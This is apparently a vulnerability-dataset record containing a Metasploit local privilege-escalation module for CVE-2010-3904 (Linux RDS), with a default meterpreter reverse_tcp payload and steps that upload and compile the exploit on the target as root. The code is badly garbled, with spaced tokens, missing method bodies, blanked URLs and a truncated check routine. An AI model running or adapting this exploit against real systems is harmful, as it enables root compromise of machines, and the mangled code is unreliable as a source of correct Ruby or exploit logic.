{
    "text": "vul_name : Reliable Datagram Sockets ( RDS ) Privilege Escalation ， vul_cve : CVE-2010-3904 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Local ， Rank = GreatRanking ， include Msf : Post : File ， include Msf : Post : Linux : Priv ， include Msf : Post : Linux : System ， include Msf : Post : Linux : Kernel ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Reliable Datagram Sockets ( RDS ) Privilege Escalation' ,  ， 'Description' => %q{ ， This module exploits a vulnerability in the rds_page_copy_user function ， in net/rds/page.c ( RDS ) in Linux kernel versions 2.6.30 to 2.6.36-rc8 ， to execute code as root ( CVE-2010-3904 ) . ， This module has been tested successfully on Fedora 13 ( i686 ) with ， kernel version 2.6.33.3-85.fc13.i686.PAE and Ubuntu 10.04 ( x86_64 )  ， with kernel version 2.6.32-21-generic. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Dan Rosenberg' ,  # Discovery and C exploit ， 'Brendan Coles' # Metasploit ，  ]  ,  ， 'DisclosureDate' => 'Oct 20 2010' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => [ 'Auto' , {} ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'AKA' , 'rds-fail.c' ]  ,  ，  [ 'EDB' , '15285' ]  ,  ，  [ 'CVE' , '2010-3904' ]  ,  ，  [ 'BID' , '44219' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ,  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' ,  ， 'WfsDelay' => 10 ,  ， 'PrependFork' => true ， } ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' , %w ( Auto True False )  ]  )  ,  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files' , '/tmp' ]  )  ,  ，  ]  ， end ， def base_dir ， datastore [ 'WritableDir' ] .to_s ， end ， def modules_disabled? ， modules_disabled = cmd_exec ( 'cat /proc/sys/kernel/modules_disabled' ) .to_s.strip ，  ( modules_disabled.eql? ( '1' )  | modules_disabled.eql? ( '2' )  ， end ， print_status \"Writing ' # {path}' (  # {data.size} bytes ) .\" ， rm_f path ， write_file path , data ， register_file_for_cleanup path ， end ， upload path , data ， cmd_exec \"chmod +x ' # {path}'\" ， end ， upload \" # {path}.c\" , data ， output = cmd_exec \"gcc -o # {path} # {path}.c\" ， unless output.blank? ， print_error output ， fail_with Failure : Unknown , \" # {path}.c failed to compile\" ， end ， cmd_exec \"chmod +x # {path}\" ， register_file_for_cleanup path ， end ， path = : File.join Msf : Config.data_directory , 'exploits' , 'cve-2010-3904' , file ， fd = : File.open path , 'rb' ， data = fd.read fd.stat.size ， fd.close ， data ， end ， def live_compile? ， vprint_good 'gcc is installed' ， end ， unless datastore [ 'COMPILE' ] .eql? 'Auto' ， fail_with Failure : BadConfig , 'gcc is not installed. Compiling will fail.' ， end ， end ， def check ， version = kernel_release ， unless Gem : Version.new ( version.split ( '-' ) .first ) >= Gem : Version.new ( '2.6.30' )  ， Gem : Version.new ( version.split ( '-' ) .first ) < Gem : Version.new ( '2.6.37' )  ， vprint_error \"Linux kernel version # {version} is not vulnerable\"",
    "time": "2018.05.21"
}